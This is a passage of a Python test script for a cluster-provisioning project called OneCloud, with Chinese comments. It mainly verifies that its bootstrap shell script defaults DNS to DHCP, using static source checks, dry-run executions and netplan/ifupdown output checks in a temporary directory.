        # --- s10: 包真的不存在时仍能透出原因 ---
        c10 = sect("OUT", "s10_dkms_install_100")
        if rc("s10_dkms_install_100") == 100 and "Unable to locate package wireguard-dkms" in c10:
            log_pass("apt 真失败时透出原始报错 (可定位到具体包)")
        else:
            log_fail("未透出 apt 原始报错", c10[-250:])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def test_bootstrap_dns_mode():
    """测试 22: bootstrap 的 DNS 新增「DHCP 自动获取」并设为默认

    背景: 原先 DNS 兜底写死 1.1.1.1 (lib-nodes.sh 亦然), 路由器已下发 DNS 的场景
    反而被硬编码盖掉, 也无法表达"不干预、交给系统"。改为默认 dhcp (自动获取)。
    """
    print("\n" + "=" * 60)
    print("测试 22: bootstrap DNS 模式 (DHCP 自动获取 / 静态指定)")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    lib = SCRIPTS_DIR / "lib-nodes.sh"
    wg = SCRIPTS_DIR / "wireguard-setup.sh"
    inv = PROJECT_ROOT / "inventory" / "nodes.yaml"
    missing = [str(p) for p in (boot, lib, wg, inv) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return
    src = boot.read_text(encoding="utf-8")
    lsrc = lib.read_text(encoding="utf-8")
    wsrc = wg.read_text(encoding="utf-8")
    isrc = inv.read_text(encoding="utf-8")

    # ---- 1) 静态检查 ----
    if "dns_is_auto()" in src and "dns_apply_mode()" in src:
        log_pass("具备 DNS 取值归一化函数 (dns_is_auto / dns_apply_mode)")
    else:
        log_fail("缺少 DNS 取值归一化函数")

    if "--dns-dhcp" in src and "dhcp|auto|none|automatic" in src:
        log_pass("支持 --dns-dhcp 及 dhcp/auto/none 等自动获取写法")
    else:
        log_fail("未识别 dhcp/auto 等自动获取写法")

    if 'DNS_SERVERS="1.1.1.1"' in src:
        log_fail("DNS 兜底仍写死 1.1.1.1", "应改为 dhcp (自动获取)")
    else:
        log_pass("bootstrap 不再把 1.1.1.1 写死为 DNS 兜底")

    if '${_NODE_FIELD[__net__.dns]:-dhcp}' in lsrc:
        log_pass("清单未配 dns 时默认 dhcp (lib-nodes.sh)")
    else:
        log_fail("lib-nodes.sh 的 NET_DNS 仍兜底成固定地址")

    if re.search(r"^\s*dns:\s*dhcp\s*$", isrc, re.M):
        log_pass("inventory/nodes.yaml 的 network.dns 已同步为 dhcp")
    else:
        log_fail("清单默认值未同步为 dhcp", "清单与脚本默认值会漂移")

    if "WG_NET_DNS" in wsrc:
        log_pass("wireguard 对 dhcp 标记做了回退 (wg0.conf 必须是具体地址)")
    else:
        log_fail("wireguard 会把 dhcp 字面值写进 wg0.conf", "客户端无法解析")

    # ---- 2) 行为验证: 跑真实脚本的 dry-run / 交互 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t22_"))

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    def run_boot(args, env_extra=None, stdin_data=None, tty="0", timeout=90):
        """跑 bootstrap。

        stdin 必须按**字节**喂: Windows 上 Python 的 text 模式会把 "\\n" 转成
        "\\r\\n", bash 的 read 会把 \\r 当成内容读进去 (交互测试会因此拿到 "\\r"
        而不是空串), 导致断言以肉眼看不见的方式失败。
        """
        env = dict(os.environ)
        env["ONECLOUD_BOOTSTRAP_TTY"] = tty
        env["ONECLOUD_ETC_ROOT"] = _posix(tmpdir)   # 越界也不会碰真实 /etc
        if env_extra:
            env.update(env_extra)
        kwargs = dict(capture_output=True, env=env, cwd=str(SCRIPTS_DIR),
                      timeout=timeout)
        if stdin_data is None:
            kwargs["stdin"] = subprocess.DEVNULL
        else:
            kwargs["input"] = stdin_data.encode("utf-8")
        r = subprocess.run(["bash", _posix(boot)] + args, **kwargs)
        return subprocess.CompletedProcess(
            r.args, r.returncode,
            r.stdout.decode("utf-8", "replace"),
            r.stderr.decode("utf-8", "replace"))

    def dns_of(out):
        m = re.search(r"^\s*DNS:\s+(.*?)\s{2,}\(来源:\s*([^)]+)\)", out, re.M)
        return m.groups() if m else (None, None)

    base = ["--node", "wk-edge-01", "--ip", "192.168.1.101", "--hostname", "edge-01"]

    try:
        # 默认 (清单 dns: dhcp)
        r = run_boot(base + ["--dry-run"])
        val, srce = dns_of(r.stdout)
        if val == "自动获取 (DHCP)" and "将设置: DNS 不写入" in r.stdout:
            log_pass("默认即为自动获取 (清单未强制静态 DNS)")
        else:
            log_fail(f"默认 DNS 不是自动获取: {val} / 来源={srce}")

        # 三种等价写法
        for arg in (["--dns", "auto"], ["--dns", "none"], ["--dns-dhcp"]):
            r = run_boot(base + arg + ["--dry-run"])
            val, srce = dns_of(r.stdout)
            if val == "自动获取 (DHCP)" and srce == "命令行":
                log_pass(f"{' '.join(arg)} 识别为自动获取")
            else:
                log_fail(f"{' '.join(arg)} 未识别为自动获取: {val} / {srce}")

        # 静态指定
        r = run_boot(base + ["--dns", "1.1.1.1,8.8.8.8", "--dry-run"])
        val, srce = dns_of(r.stdout)
        if val == "1.1.1.1, 8.8.8.8" and "将设置: DNS = 1.1.1.1, 8.8.8.8" in r.stdout:
            log_pass("--dns 指定多个地址时按列表写入")
        else:
            log_fail(f"静态 DNS 处理不正确: {val} / {srce}")

        # 环境变量
        r = run_boot(base + ["--dry-run"], {"ONECLOUD_DNS": "223.5.5.5"})
        val, srce = dns_of(r.stdout)
        if val == "223.5.5.5" and srce == "环境变量":
            log_pass("ONECLOUD_DNS 生效并标注来源")
        else:
            log_fail(f"ONECLOUD_DNS 未生效: {val} / {srce}")

        # 优先级: --dns > ONECLOUD_DNS
        r = run_boot(base + ["--dns", "8.8.8.8", "--dry-run"], {"ONECLOUD_DNS": "223.5.5.5"})
        val, srce = dns_of(r.stdout)
        if val == "8.8.8.8" and srce == "命令行":
            log_pass("--dns 优先于 ONECLOUD_DNS")
        else:
            log_fail(f"优先级错误: {val} / {srce}")

        # 交互: 回车 = 自动获取, 且在确认环节取消 (不会修改系统)
        r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.1.101"],
                     stdin_data="\nn\n", tty="1")
        if "自动获取 (DHCP)" in r.stdout and "设置主机名" not in r.stdout:
            log_pass("交互式直接回车 = 自动获取 (且确认前可安全取消)")
        else:
            log_fail("交互式回车未走自动获取", r.stdout[-300:])

        r = run_boot(["--node", "wk-edge-01", "--ip", "192.168.1.101"],
                     stdin_data="8.8.8.8\nn\n", tty="1")
        if "8.8.8.8" in r.stdout and "设置主机名" not in r.stdout:
            log_pass("交互式输入地址覆盖默认值")
        else:
            log_fail("交互式覆盖失败", r.stdout[-300:])

        # ---- 3) 步骤 11 实际写盘 (4 种组合) ----
        lines = src.splitlines()
        i11 = next((i for i, l in enumerate(lines)
                    if l.startswith("# ---- 11. 设置静态 IP")), -1)
        i12 = next((i for i, l in enumerate(lines)
                    if l.startswith("# ---- 12. 配置")), -1)
        if min(i11, i12) < 0:
            log_fail("无法定位步骤 11 锚点", "代码结构变了, 需同步更新本测试")
            return
        flow11 = "\n".join(lines[i11:i12])
        probe = tmpdir / "probe11.sh"
        probe.write_text(
            'GREEN=""; YELLOW=""; RED=""; NC=""\n'
            'log_info()  { echo "[INFO] $*"; }\n'
            'log_warn()  { echo "[WARN] $*"; }\n'
            'log_error() { echo "[ERROR] $*"; }\n'
            + flow11 + "\n",
            encoding="utf-8", newline="\n")

        def run_step11(tag, layout, mode, servers, dlist):
            root = tmpdir / f"etc_{tag}"
            if layout == "ifupdown":
                (root / "network").mkdir(parents=True, exist_ok=True)
                (root / "network" / "interfaces").write_text("", encoding="utf-8")
                artifact = root / "network" / "interfaces"
            else:
                (root / "netplan").mkdir(parents=True, exist_ok=True)
                artifact = root / "netplan" / "99-static.yaml"
            env = dict(os.environ)
            env.update({
                "ONECLOUD_ETC_ROOT": _posix(root),
                "NODE_IP": "192.168.6.101", "LAN_PREFIX": "24",
                "GATEWAY": "192.168.6.1", "DNS_MODE": mode,
                "DNS_SERVERS": servers, "DNS_LIST": dlist,
            })
            subprocess.run(["bash", _posix(probe)], env=env, cwd=str(SCRIPTS_DIR),
                           capture_output=True, text=True, encoding="utf-8",
                           errors="replace", stdin=subprocess.DEVNULL, timeout=60)
            return artifact.read_text(encoding="utf-8") if artifact.exists() else ""

        s = run_step11("a", "ifupdown", "dhcp", "", "自动获取 (DHCP)")
        if "address 192.168.6.101/24" in s and "dns-nameservers" not in s:
            log_pass("ifupdown + 自动获取: 写静态地址但不写 dns-nameservers")
        else:
            log_fail("ifupdown 自动获取模式下仍写入了 dns-nameservers", s[:200])

        s = run_step11("b", "ifupdown", "static", "1.1.1.1,8.8.8.8", "1.1.1.1, 8.8.8.8")
        if "dns-nameservers 1.1.1.1, 8.8.8.8" in s:
            log_pass("ifupdown + 静态指定: 正常写入 dns-nameservers")
        else:
            log_fail("ifupdown 静态 DNS 未写入", s[:200])

        s = run_step11("c", "netplan", "dhcp", "", "自动获取 (DHCP)")
        if "dhcp4: true" in s and "use-routes: false" in s and "nameservers" not in s:
            log_pass("netplan + 自动获取: dhcp4 只取 DNS (关 use-routes), 不写 nameservers")
        else:
            log_fail("netplan 自动获取配置不正确", s[:250])
        if "addresses:" in s and "192.168.6.101/24" in s and "via: 192.168.6.1" in s:
            log_pass("netplan 自动获取模式仍保留静态地址与静态网关")
        else:
            log_fail("netplan 静态地址/网关丢失", s[:250])

        s = run_step11("d", "netplan", "static", "223.5.5.5", "223.5.5.5")
        if "nameservers:" in s and "- 223.5.5.5" in s and "dhcp4" not in s:
            log_pass("netplan + 静态指定: 写 nameservers 列表, 不启用 dhcp4")
        else:
            log_fail("netplan 静态 DNS 配置不正确", s[:250])

        # ---- 4) 文档同步 ----
        readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
        if "DNS 默认为 `dhcp`" in readme and "--dns-dhcp" in readme:
            log_pass("README 已记录 DNS 默认值与自动获取写法")
        else:
            log_fail("README 未说明新的 DNS 默认行为", "文档与实际行为会漂移")

        sreadme = (SCRIPTS_DIR / "README.md").read_text(encoding="utf-8")
        if "dhcp" in sreadme and "DNS" in sreadme:
            log_pass("scripts/README 已同步 DNS 说明")
        else:
            log_fail("scripts/README 未同步 DNS 说明")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 主程序 ============
def main():
    print("=" * 60)
    print("OneCloud Cluster 功能验证")
    print("=" * 60)
    print(f"项目路径: {PROJECT_ROOT}")
    
    # 运行所有测试
    tests = [
        ("配置文件完整性", test_config_files),
        ("节点目录结构", test_node_directories),
        ("脚本语法检查", test_script_syntax),
        ("deploy.sh 节点映射", test_deploy_node_mapping),
        ("fallback 机制", test_fallback_mechanism),
        ("health-check 变量", test_health_check_variables),
        ("cloudflared 命令", test_cloudflared_command),
        ("panel 错误处理", test_panel_app_error_handling),
        ("xiaomusic 下载", test_xiaomusic_download),
        ("panel install-service", test_panel_install_service),
        ("服务一致性", test_service_consistency),
        ("文档化 CLI 接口契约", test_cli_contract),
        ("节点 IP 自定义与主机名", test_ip_customizable),
        ("安全与健壮性回归", test_safety_regression),
        ("面板前后端契约", test_panel_frontend_contract),
        ("bootstrap 网络取值", test_bootstrap_network_resolution),
        ("bootstrap SD与风险", test_bootstrap_sd_and_risk),
        ("init 交互式入口", test_init_entrypoint),
        ("交付物一致性", test_delivery_consistency),
        ("Python 依赖降级链", test_pydeps_fallback),
        ("bootstrap apt 源与依赖", test_bootstrap_apt_sources),
        ("bootstrap DNS 模式", test_bootstrap_dns_mode),
    ]
    
    for test_name, test_func in tests:
        log_info(f"运行测试: {test_name}")
        try:
            test_func()
        except Exception as e:
            log_fail(f"测试 '{test_name}' 异常: {str(e)}")
    
    # 生成报告
    success = generate_report()
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
